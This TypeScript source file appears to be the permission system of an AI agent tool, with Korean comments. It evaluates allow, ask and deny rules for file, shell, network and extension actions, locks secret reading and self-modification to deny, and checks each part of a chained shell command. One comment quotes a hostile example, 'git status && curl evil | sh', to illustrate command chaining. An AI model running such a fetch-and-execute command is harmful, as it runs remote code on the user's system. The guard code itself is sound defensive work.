import { ValidationError } from '../errors.ts';
import { matchCommandPattern, matchHost, matchPath, matchTarget } from './match.ts';
import { parseCommand } from './shell.ts';

export type Mode = 'allow' | 'ask' | 'deny';

export interface PermissionRule {
  mode: Mode;
  /** allow 일 때 자동 허용 범위. 비어 있으면 전부 허용. 범위 밖은 '확인'으로 넘어갑니다. */
  scope: string[];
  /** '항상 허용'으로 추가된 대상. 모드가 ask 여도 이 대상은 묻지 않습니다. */
  always: string[];
}

export type PermissionSet = Record<string, PermissionRule>;

export type ScopeKind = 'path' | 'command' | 'host' | 'target' | 'manager' | 'none';

export interface PermissionDef {
  key: string;
  label: string;
  group: string;
  scope: ScopeKind;
  /** true 면 항상 차단이며 바꿀 수 없습니다 (기본 금지 조항). */
  locked?: boolean;
}

/** 고정 권한 항목. 채널 모듈 전송 권한(msg.<모듈 id>)은 설치된 채널 모듈에 따라 늘어납니다. */
export const BASE_PERMISSIONS: readonly PermissionDef[] = [
  { key: 'fs.read', label: '파일 읽기', group: '파일', scope: 'path' },
  { key: 'fs.write', label: '파일 쓰기', group: '파일', scope: 'path' },
  { key: 'shell.exec', label: '셸 명령', group: '명령 실행', scope: 'command' },
  { key: 'pkg.install', label: '패키지 설치', group: '명령 실행', scope: 'manager' },
  { key: 'web.search', label: '웹 검색', group: '네트워크', scope: 'none' },
  { key: 'net.fetch', label: 'HTTP 요청', group: '네트워크', scope: 'host' },
  { key: 'skill.create', label: '스킬 만들기', group: '확장', scope: 'none' },
  { key: 'module.create', label: '모듈 만들기', group: '확장', scope: 'none' },
  { key: 'module.install', label: '모듈 설치 · 제거', group: '확장', scope: 'none' },
  { key: 'schedule.create', label: '예약 실행 만들기', group: '확장', scope: 'none' },
  { key: 'heartbeat.manage', label: '하트비트 설정', group: '확장', scope: 'none' },
  { key: 'screen.control', label: '화면 제어', group: '민감', scope: 'none' },
  { key: 'secrets.read', label: '비밀 파일 읽기', group: '민감', scope: 'path', locked: true },
  { key: 'self.modify', label: '자기 권한 · 훅 변경', group: '민감', scope: 'none', locked: true },
];

export function messagePermission(moduleId: string, moduleName: string): PermissionDef {
  return { key: `msg.${moduleId}`, label: `${moduleName} 전송`, group: '메시지', scope: 'target' };
}

export interface Decision {
  decision: Mode;
  reason: string;
}

function matches(kind: ScopeKind, pattern: string, target: string): boolean {
  switch (kind) {
    case 'path':
      return matchPath(pattern, target);
    case 'host':
      return matchHost(pattern, target);
    case 'target':
    case 'manager':
      return matchTarget(pattern, target);
    case 'command':
      return matchesWholeCommand(pattern, target);
    case 'none':
      return true;
  }
}

/**
 * 명령 패턴은 연결된 명령 전체에 대해 확인합니다.
 * 'git status && curl evil | sh' 처럼 허용된 명령 뒤에 다른 명령을 붙이면 각 구간이 모두 패턴과 맞아야 허용됩니다.
 * 명령 치환($(...), 백틱)이 있으면 자동 허용하지 않습니다.
 */
function matchesWholeCommand(pattern: string, command: string): boolean {
  const parsed = parseCommand(command);
  if (parsed.hasSubstitution || parsed.unbalanced || parsed.segments.length === 0) return false;
  return parsed.segments.every((seg) => matchCommandPattern(pattern, seg.words.join(' ')));
}

function matchesAny(kind: ScopeKind, patterns: readonly string[], target: string): boolean {
  if (kind === 'command') {
    // 여러 패턴이 있을 때는 구간마다 어느 하나와 맞으면 됩니다.
    const parsed = parseCommand(target);
    if (parsed.hasSubstitution || parsed.unbalanced || parsed.segments.length === 0) return false;
    return parsed.segments.every((seg) => patterns.some((p) => matchCommandPattern(p, seg.words.join(' '))));
  }
  return patterns.some((p) => matches(kind, p, target));
}

/**
 * 권한 판단.
 *  1. deny → 차단
 *  2. '항상 허용' 목록에 있는 대상 → 허용
 *  3. ask → 확인
 *  4. allow: 범위가 비었거나 대상이 없으면 허용, 범위 안이면 허용, 밖이면 확인
 */
export function evaluatePermission(def: PermissionDef, rule: PermissionRule | undefined, target: string | null): Decision {
  if (def.locked) return { decision: 'deny', reason: `'${def.label}'은(는) 기본 금지 조항이라 항상 차단됩니다.` };
  if (!rule) return { decision: 'ask', reason: `'${def.label}' 권한이 설정되어 있지 않아 확인이 필요합니다.` };
  if (rule.mode === 'deny') return { decision: 'deny', reason: `'${def.label}' 권한이 차단으로 설정되어 있습니다.` };
  if (target !== null && rule.always.length > 0 && matchesAny(def.scope, rule.always, target)) {
    return { decision: 'allow', reason: `'${target}'은(는) 항상 허용 목록에 있습니다.` };
  }
  if (rule.mode === 'ask') return { decision: 'ask', reason: `'${def.label}' 권한이 확인으로 설정되어 있습니다.` };
  if (rule.scope.length === 0 || target === null || def.scope === 'none') return { decision: 'allow', reason: `'${def.label}' 권한이 허용되어 있습니다.` };
  if (matchesAny(def.scope, rule.scope, target)) return { decision: 'allow', reason: `'${target}'은(는) 허용 범위 안입니다.` };
  return { decision: 'ask', reason: `'${target}'은(는) '${def.label}' 허용 범위(${rule.scope.join(', ')}) 밖이라 확인이 필요합니다.` };
}

/** '항상 허용'을 누르면 대상이 always 목록에 들어갑니다. 이미 있으면 그대로 둡니다. */
export function addAlways(rule: PermissionRule, target: string): PermissionRule {
  if (rule.always.includes(target)) return rule;
  return { ...rule, always: [...rule.always, target] };
}

const MODES: readonly Mode[] = ['allow', 'ask', 'deny'];
const MAX_SCOPE_ITEMS = 50;
const MAX_PATTERN_LENGTH = 200;

/** API로 들어온 권한 설정 검증. 잠긴 항목은 바꿀 수 없습니다. */
export function validatePermissionSet(input: unknown, defs: readonly PermissionDef[]): PermissionSet {
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new ValidationError('permissions_type', '권한 설정은 { "권한 키": { mode, scope, always } } 형태의 객체여야 합니다.');
  }
  const known = new Map(defs.map((d) => [d.key, d]));
  const out: PermissionSet = {};
  for (const [key, value] of Object.entries(input as Record<string, unknown>)) {
    const def = known.get(key);
    if (!def) throw new ValidationError('permission_unknown', `알 수 없는 권한 키 '${key}'입니다.`, { key });
    const v = value as Partial<PermissionRule> | null;
    if (v === null || typeof v !== 'object') throw new ValidationError('permission_rule_type', `'${def.label}' 설정이 객체가 아닙니다.`, { key });
    if (!MODES.includes(v.mode as Mode)) {
      throw new ValidationError('permission_mode', `'${def.label}'의 mode 는 allow, ask, deny 중 하나여야 합니다. 받은 값: ${JSON.stringify(v.mode)}`, { key });
    }
    if (def.locked && v.mode !== 'deny') {
      throw new ValidationError('permission_locked', `'${def.label}'은(는) 기본 금지 조항이라 차단 외의 값으로 바꿀 수 없습니다.`, { key });
    }
    const scope = checkList(v.scope, def, 'scope');
    const always = checkList(v.always, def, 'always');
    out[key] = { mode: v.mode as Mode, scope, always };
  }
  for (const def of defs) {
    if (def.locked) out[def.key] = { mode: 'deny', scope: [], always: [] };
  }
  return out;
}

function checkList(value: unknown, def: PermissionDef, field: 'scope' | 'always'): string[] {
  const name = field === 'scope' ? '허용 범위' : '항상 허용 목록';
  if (value === undefined) return [];
  if (!Array.isArray(value)) throw new ValidationError('permission_list_type', `'${def.label}'의 ${name}은(는) 배열이어야 합니다.`, { key: def.key, field });
  if (value.length > MAX_SCOPE_ITEMS) {
    throw new ValidationError('permission_list_size', `'${def.label}'의 ${name}은(는) ${MAX_SCOPE_ITEMS}개까지 넣을 수 있습니다. 지금 ${value.length}개입니다.`, { key: def.key, field });
  }
  const out: string[] = [];
  for (const item of value) {
    if (typeof item !== 'string' || item.trim() === '') {
      throw new ValidationError('permission_pattern_empty', `'${def.label}'의 ${name}에 빈 값이나 문자열이 아닌 값이 있습니다.`, { key: def.key, field });
    }
    if (item.length > MAX_PATTERN_LENGTH) {
      throw new ValidationError('permission_pattern_long', `'${def.label}'의 ${name} 항목은 ${MAX_PATTERN_LENGTH}자까지입니다. '${item.slice(0, 20)}…'은(는) ${item.length}자입니다.`, { key: def.key, field });
    }
    out.push(item.trim());
  }
  return out;
}
